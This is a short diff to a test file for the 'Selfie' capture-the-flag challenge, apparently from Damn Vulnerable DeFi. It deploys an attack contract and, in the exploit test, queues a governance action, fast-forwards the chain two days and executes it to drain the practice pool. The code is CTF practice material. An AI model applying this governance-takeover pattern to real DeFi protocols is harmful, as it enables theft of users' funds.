@@ -27,10 +27,22 @@ describe('[Challenge] Selfie', function () {
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.equal(TOKENS_IN_POOL);
+
+        const AttackSelfiePoolFactory = await ethers.getContractFactory('AttackSelfiePool', deployer);
+        this.attackContract = await AttackSelfiePoolFactory.deploy(
+            this.token.address,
+            this.pool.address,
+            this.governance.address
+        );
+
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        actionId = await this.attackContract.connect(attacker).exploitQueueAction();
+        console.log("Action Id : ", actionId.value.toString());
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await this.attackContract.connect(attacker).executeAction();
     });
 
     after(async function () {
